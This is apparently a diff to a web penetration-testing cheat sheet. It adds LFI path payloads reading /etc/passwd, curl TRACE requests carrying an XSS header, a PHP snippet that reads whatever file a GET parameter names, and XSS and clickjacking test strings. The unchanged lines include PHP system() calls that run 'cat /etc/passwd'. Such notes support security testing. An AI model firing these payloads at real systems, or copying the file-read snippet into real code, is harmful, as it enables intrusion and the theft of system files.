@@ -11,15 +11,16 @@
 ```
 ## Local File Inclusion (LFI):
 ```
-
-
+<?php include 'C:\Windows\System32\drivers\etc\hosts';?>
+/etc/passwd
+/etc/hosts
+/../../etc/passwd
 ```
 ## Remote Code Execution (RCE):
 ```
 <?php system("cat /etc/passwd");?>
 <?php system("id");?>
 <?php echo phpinfo(); ?>
-<?php include 'C:\Windows\System32\drivers\etc\hosts';?>
 ```
 ## Malicious File Upload (Shell Execution):
 ```
@@ -115,23 +116,28 @@ Step4: If its working properly, then it No Session Termination Vulnerability.
 ```
 ### Concurrent Logins with the Same Username in admin/user account:
 ```
-
+Step1: Same time, try to login same user in two different computer.
 ```
 ### Trace method Enabled:
 ```
+Step1: $ curl -X TRACE -H "X-Header: geeknik/pentest" https://url.com
+Step2: $ curl -X TRACE -H "Via: <svg/onload=alert('XSS')>" https://url.com
+
+https://hackerone.com/reports/222692
 ```
 ### Full path disclosure:
 ```
+/?file=
+/?page=
 
+<?php
+   echo file_get_contents(getcwd().$_GET['page']);
+?>
 ```
 ### Improper Input Validation in the Application:
 ```
 <script>alert(1)</script>
 <h1>Test</h1>
-```
-### Client side validation bypass of email and phone number verification:
-```
-
 ```
 ### Application is Vulnerable to Clickjacking Attacks:
 ```
@@ -144,8 +150,4 @@ Step4: If its working properly, then it No Session Termination Vulnerability.
 <iframe src="https://url.com" width="500" height="500"></iframe>
 </body>
 </html>
-```
-### Last Login Time Not Implemented in the Application:
-```
-
 ```
